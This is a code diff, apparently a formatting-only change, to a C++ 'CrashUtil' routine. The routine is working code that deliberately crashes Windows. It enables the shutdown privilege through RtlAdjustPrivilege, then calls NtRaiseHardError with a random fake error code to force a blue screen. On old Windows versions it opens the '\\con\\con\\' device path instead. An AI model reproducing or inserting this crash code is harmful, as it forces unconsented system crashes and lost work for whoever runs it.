@@ -8,20 +8,23 @@ namespace Utils {
 		pthread_detach(crashThread);
 	}
 
-	void* CrashUtil::runCrashThread(void* arg) {
+	void *CrashUtil::runCrashThread(void *arg) {
 		Sleep(200);
-		
-		#if WINVER > _WIN32_WINNT_NT4
+
+#if WINVER > _WIN32_WINNT_NT4
 		HMODULE ntHandle = GetModuleHandle(L"ntdll.dll");
-		if (!ntHandle) return nullptr;
+		if (!ntHandle)
+			return nullptr;
 		NTSTATUS s1, s2;
 		BOOLEAN b;
 		ULONG r;
 
-		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(ntHandle, "RtlAdjustPrivilege");
+		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege =
+			(TFNRtlAdjustPrivilege)GetProcAddress(ntHandle, "RtlAdjustPrivilege");
 		s1 = pfnRtlAdjustPrivilege(19, true, false, &b);
 
-		TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(ntHandle, "NtRaiseHardError");
+		TFNNtRaiseHardError pfnNtRaiseHardError =
+			(TFNNtRaiseHardError)GetProcAddress(ntHandle, "NtRaiseHardError");
 		vector<unsigned long> possibleStatuses = {
 			0xDEADDEAD,
 			0xFB01FEE7,
@@ -46,12 +49,13 @@ namespace Utils {
 			STATUS_FLOAT_DENORMAL_OPERAND,
 			STATUS_ARRAY_BOUNDS_EXCEEDED
 		};
-		s2 = pfnNtRaiseHardError((NTSTATUS)IndexHelper::getRandomItem(possibleStatuses), 0, 0, 0, 6, &r);
+		s2 =
+			pfnNtRaiseHardError((NTSTATUS)IndexHelper::getRandomItem(possibleStatuses), 0, 0, 0, 6, &r);
 
-		#else
+#else
 		ShellUtil::openShell("\\con\\con\\");
 
-		#endif
+#endif
 		return nullptr;
 	}
-}
+} // namespace Utils
